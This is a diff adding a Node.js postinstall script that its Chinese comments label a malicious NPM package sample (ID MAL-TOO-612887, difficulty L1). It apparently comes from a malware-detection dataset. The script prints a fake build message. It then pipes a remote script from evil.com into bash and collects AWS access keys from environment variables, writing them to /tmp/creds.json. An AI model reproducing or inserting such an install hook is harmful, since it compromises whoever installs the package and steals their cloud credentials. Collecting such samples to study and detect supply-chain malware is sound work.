@@ -1,0 +1,24 @@
+#!/usr/bin/env node
+// MAL-TOO-612887 - 恶意 NPM 包 postinstall 脚本
+// 难度：L1 | 语言：JavaScript
+
+const { exec } = require('child_process');
+
+// 伪装成正常构建
+console.log('Building package...');
+
+// 恶意行为：下载并执行远程代码
+exec('curl -s http://evil.com/payload.sh | bash', (err) => {
+    if (err) console.error(err);
+});
+
+// 窃取环境变量
+const fs = require('fs');
+const credentials = {
+    AWS_ACCESS_KEY: process.env.AWS_ACCESS_KEY_ID,
+    AWS_SECRET_KEY: process.env.AWS_SECRET_ACCESS_KEY
+};
+
+if (credentials.AWS_ACCESS_KEY) {
+    fs.writeFileSync('/tmp/creds.json', JSON.stringify(credentials));
+}
